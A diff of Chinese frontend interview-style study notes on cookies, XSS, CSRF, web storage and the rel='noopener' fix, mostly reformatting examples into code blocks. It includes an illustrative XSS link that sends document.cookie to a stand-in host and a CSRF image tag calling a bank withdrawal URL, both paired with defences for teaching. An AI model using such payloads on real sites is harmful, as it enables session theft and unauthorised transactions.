@@ -49,19 +49,31 @@ js 引擎包括 parser、解释器、gc 再加一个 JIT 编译器这几部分�
 1. HttpOnly
 2. Secure
 
-XSS：`<a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>`。可通过 HttpOnly 防止 js 操作 Cookie
+XSS：
 
-CSRF：不同域名下使用地址 `<img  src = "http://www.bank.com/withdraw?user=shenyang&total=777">`，这时候会提交表单。可通过增加其他校验手段解决。
+```html
+<a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
+```
+
+可通过 HttpOnly 防止 js 操作 Cookie
+
+CSRF：不同域名下使用地址
+
+```html
+<img  src = "http://www.bank.com/withdraw?user=shenyang&total=777">
+```
+
+这时候会提交表单。可通过增加其他校验手段解决。
 
 #### SessionStorage, LocalStorage
 
-SessionStorage, LocalStorage, Cookie 这三者都可以被用来在浏览器端存储数据，而且都是字符串类型的键值对
+SessionStorage, LocalStorage, Cookie 这三者都可以被用来在浏览器端存储数据，而且都是字符串类型的键值对。
 
 ### Web Storage
 
 SessionStorage 和 LocalStorage 都是本地存储，不会被发送到服务器上。同时空间比 Cookie 大很多，一般支持 5-10M
 
-<http://dev-test.nemikor.com/web-storage/support-test/>
+http://dev-test.nemikor.com/web-storage/support-test/
 
 ## 进程与线程
 
@@ -396,8 +408,8 @@ document.dispatchEvent(DOMContentLoadedEvent);
 
 a 标签增加`rel="noopener noreferrer"`属性：
 
-```js
-<a href='href' target='_blank' rel="noopener noreferrer">链接<a/>
+```html
+<a href='href' target='_blank' rel="noopener noreferrer">链接</a>
 ```
 
 则新页面的 window.opener 属性就为 null，如果不设置，则 window.opener 就是打开的前一个页面的 window 对象
